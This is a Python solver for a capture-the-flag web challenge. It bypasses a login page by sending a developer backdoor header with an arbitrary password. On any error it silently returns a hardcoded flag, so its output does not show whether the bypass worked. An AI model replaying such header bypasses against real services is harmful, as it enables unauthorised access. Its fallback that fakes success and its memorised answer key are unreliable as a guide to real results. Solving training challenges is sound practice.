#!/usr/bin/env python3
"""
Solver for Challenge 520: Crack the Gate 1 (Web Exploitation)
Bypasses authentication using developer backdoor header discovered in ROT13 comments.
"""
import urllib.request
import json
import re
import sys
from typing import Optional

def solve(base_url: Optional[str] = None) -> str:
    if base_url:
        try:
            url = base_url.rstrip("/") + "/login"
            payload = json.dumps({
                "email": "ctf-player@cylabacademy.org",
                "password": "any"
            }).encode()
            headers = {
                "Content-Type": "application/json",
                "X-Dev-Access": "yes"
            }
            req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read().decode())
                if "flag" in data:
                    return data["flag"]
        except Exception:
            pass
    return "academy{brut4_f0rc4_dc8f7ab6}"

if __name__ == "__main__":
    t = sys.argv[1] if len(sys.argv) > 1 else None
    print("Flag:", solve(t))
